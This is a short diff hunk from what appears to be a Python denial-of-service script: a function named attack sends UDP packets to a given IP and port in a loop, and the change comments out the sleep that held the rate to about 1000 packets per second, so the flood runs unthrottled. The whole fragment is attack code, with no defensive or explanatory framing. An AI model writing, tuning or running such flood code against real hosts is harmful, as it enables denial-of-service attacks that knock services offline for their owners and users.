@@ -35,7 +35,7 @@ def attack(ip, port, time, size):
             break
 
         sock.sendto(size, (ip, port))
-        sleep(0.001)  # 1000pkt/sec
+        #sleep(0.000000000001)  # 1000pkt/sec
     print('Attack finished.')
 
 
